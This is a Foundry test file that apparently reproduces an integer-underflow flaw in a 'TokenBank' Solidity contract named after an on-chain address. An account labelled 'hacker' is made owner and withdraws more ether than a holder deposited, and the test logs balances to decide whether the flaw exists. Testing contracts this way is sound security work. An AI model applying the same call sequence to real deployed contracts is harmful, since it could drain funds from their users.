// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x3a0e9acd953ffc0dd18d63603488846a6b8b2b01.sol";

contract UnderflowTest is Test {
    TokenBank tokenBank;
    address owner = address(0x1);
    address holder = address(0x2);
    address hacker = address(0x3);
    
    function setUp() public {
        vm.deal(owner, 5 ether);
        vm.deal(holder, 5 ether);
        vm.deal(hacker, 5 ether);
        
        vm.startPrank(owner);
        tokenBank = new TokenBank();
        vm.stopPrank();
        
        // Make hacker the owner
        vm.prank(owner);
        tokenBank.changeOwner(hacker);
        
        // Holder deposits to create a balance
        vm.prank(holder);
        tokenBank.Deposit{value: 1.5 ether}();
        
        // Hacker deposits minimal amount to satisfy condition
        vm.prank(hacker);
        tokenBank.Deposit{value: 1 wei}();
    }

    function testUnderflow() public {
        console.log("--- BEFORE-Trigger Contract Balance ---");
        uint256 initialBankBalance = address(tokenBank).balance;
        console.log("Initial contract balance: %d wei", initialBankBalance);
        
        console.log("--- Trigger WithdrawToHolder ---");
        // Hacker performs withdraw with insufficient holder balance to cause underflow
        vm.prank(hacker);
        tokenBank.WithdrawToHolder(holder, 2 ether);

        console.log("--- AFTER-Trigger Contract Balance ---");
        uint256 postAttackBankBalance = address(tokenBank).balance;
        console.log("Post-attack contract balance: %d wei", postAttackBankBalance);

        // Check for balance change
        if (initialBankBalance == postAttackBankBalance) {
            console.log("Vulnerability Exists: Contract balance unchanged due to underflow vulnerability");
        } else {
            console.log("Vulnerability not Exist: Contract balance changed - no exploitation occurred");
        }

        // Original assertion remains
        assertEq(
            initialBankBalance, 
            postAttackBankBalance,
            "Ether was withdrawn despite insufficient balance"
        );
    }
}